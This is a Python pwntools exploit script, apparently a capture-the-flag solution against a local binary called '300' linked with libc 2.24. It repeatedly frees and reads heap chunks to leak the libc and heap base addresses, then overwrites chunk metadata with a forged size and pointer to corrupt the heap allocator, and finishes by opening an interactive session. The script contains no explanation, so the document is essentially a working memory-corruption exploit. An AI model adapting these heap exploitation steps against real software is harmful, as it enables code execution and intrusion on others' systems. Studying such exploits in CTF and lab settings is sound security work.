#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./300")
p = process("./300")
libc = ELF("./libc-2.24.so")
gdb.attach(p,"init-pwndbg")

def malloc(index):
    p.sendlineafter("4) free\n","1")
    p.recvline()
    p.sendline(str(index))

def free(index):
    p.sendlineafter("4) free\n","4")
    p.recvline()
    p.sendline(str(index))

def read(index):
    p.sendlineafter("4) free\n","3")
    p.recvline()
    p.sendline(str(index))
    return p.recvline()[:-1]

def write(index,data):
    p.sendlineafter("4) free\n","2")
    p.recvline()
    p.sendline(str(index))
    p.send(data)

malloc(0)
malloc(1)
free(0)
leak = read(0)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x396b58
log.critical("Libc base: {}".format(hex(libc.address)))
malloc(0)
malloc(2)
malloc(3)
free(2)
free(0)
leak = read(0)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
heap_base = leak - 0x620
log.critical("heap base address :{}".format(hex(heap_base)))
free(1)
free(3)
malloc(0)
malloc(1)
malloc(2)
free(1)
write(0,b'a'*0x2e0+p64(0x0)+p64(0x311)+b'a'*8+b'b'*8)
write(1,p64(0x0)+p64(heap_base+0x2f0))
malloc(1)
malloc(4)
p.interactive()